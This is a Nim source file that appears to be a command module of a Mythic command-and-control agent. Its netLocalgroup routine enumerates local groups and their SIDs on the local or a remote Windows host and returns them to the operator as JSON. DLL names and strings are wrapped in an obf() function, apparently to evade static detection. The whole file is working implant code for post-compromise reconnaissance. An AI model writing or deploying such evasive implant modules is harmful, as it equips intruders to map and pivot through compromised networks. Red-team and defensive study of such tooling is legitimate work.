import std/[json, strformat, os]
import ../utils/mythic_responses
import ../utils/debug
import ../utils/strenc

when defined(windows):
  import winim/lean
  import std/widestrs
  
  const
    NO_ERROR = 0
  
  type
    LOCALGROUP_INFO_1 = object
      lgrpi1_name: LPWSTR
      lgrpi1_comment: LPWSTR
    
    NetLocalGroup = object
      computer_name: string
      group_name: string
      comment: string
      sid: string
  
  proc NetLocalGroupEnum(servername: LPCWSTR, level: DWORD, bufptr: ptr pointer,
                         prefmaxlen: DWORD, entriesread: ptr DWORD,
                         totalentries: ptr DWORD, resumehandle: ptr DWORD): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc NetApiBufferFree(Buffer: pointer): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc ConvertSidToStringSidW(Sid: PSID, StringSid: ptr LPWSTR): WINBOOL 
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
  
  proc utf16PtrToString(p: LPWSTR): string =
    ## Convert UTF-16 pointer to Nim string
    if p.isNil:
      return ""
    result = $cast[WideCString](p)
  
  proc getGroupSid(computerName: string, groupName: string): string =
    ## Get SID for a group
    var sid = newSeq[byte](64)
    var sidSize: DWORD = 64
    var domainName = newSeq[WCHAR](256)
    var domainNameSize: DWORD = 256
    var sidNameUse: DWORD = 0
    
    var computerNameW: LPCWSTR = nil
    if computerName != "":
      let tempW = newWideCString(computerName)
      computerNameW = cast[LPCWSTR](unsafeAddr tempW[0])
    let groupNameW = newWideCString(groupName)
    
    let success = LookupAccountNameW(
      computerNameW,
      cast[LPCWSTR](unsafeAddr groupNameW[0]),
      cast[PSID](addr sid[0]),
      cast[LPDWORD](addr sidSize),
      cast[LPWSTR](addr domainName[0]),
      cast[LPDWORD](addr domainNameSize),
      cast[PSID_NAME_USE](addr sidNameUse)
    )
    
    if success == 0:
      return "Unknown"
    
    var sidStringPtr: LPWSTR = nil
    let sidToStringSuccess = ConvertSidToStringSidW(cast[PSID](addr sid[0]), addr sidStringPtr)
    
    if sidToStringSuccess == 0:
      return "Unknown"
    
    result = utf16PtrToString(sidStringPtr)
    
    # Free the SID string buffer
    discard LocalFree(cast[HLOCAL](sidStringPtr))

proc netLocalgroup*(taskId: string, params: JsonNode): JsonNode =
  ## Enumerate local groups
  when defined(windows):
    try:
      # Parse parameters (computer is optional)
      var computerName = ""
      if params.kind == JObject and params.hasKey(obf("computer")):
        computerName = params[obf("computer")].getStr()
      
      # Default to local computer if not specified
      if computerName == "":
        computerName = getEnv(obf("COMPUTERNAME"), obf("Local"))
      
      debug &"[DEBUG] net_localgroup: computer={computerName}"
      
      var bufPtr: pointer = nil
      var entriesRead: DWORD = 0
      var totalEntries: DWORD = 0
      var resumeHandle: DWORD = 0
      
      var computerNameW: LPCWSTR = nil
      if computerName != "" and computerName != obf("Local"):
        let tempW = newWideCString(computerName)
        computerNameW = cast[LPCWSTR](unsafeAddr tempW[0])
      
      let status = NetLocalGroupEnum(
        computerNameW,
        1,  # Level 1 for LOCALGROUP_INFO_1
        addr bufPtr,
        DWORD.high,  # Maximum buffer size
        addr entriesRead,
        addr totalEntries,
        addr resumeHandle
      )
      
      var results: seq[NetLocalGroup] = @[]
      
      if status == NO_ERROR:
        let groups = cast[ptr UncheckedArray[LOCALGROUP_INFO_1]](bufPtr)
        
        for i in 0..<entriesRead.int:
          let groupName = utf16PtrToString(groups[i].lgrpi1_name)
          let comment = utf16PtrToString(groups[i].lgrpi1_comment)
          let sid = getGroupSid(computerName, groupName)
          
          results.add(NetLocalGroup(
            computer_name: computerName,
            group_name: groupName,
            comment: comment,
            sid: sid
          ))
        
        # Free the buffer
        discard NetApiBufferFree(bufPtr)
      else:
        return mythicError(taskId, obf("Error enumerating local groups: ") & $status)
      
      # Convert to JSON
      var resultsJson = newJArray()
      for result in results:
        resultsJson.add(%*{
          obf("computer_name"): result.computer_name,
          obf("group_name"): result.group_name,
          obf("comment"): result.comment,
          obf("sid"): result.sid
        })
      
      return mythicSuccess(taskId, $resultsJson)
      
    except Exception as e:
      return mythicError(taskId, obf("net_localgroup error: ") & e.msg)
  else:
    return mythicError(taskId, obf("net_localgroup command is only available on Windows"))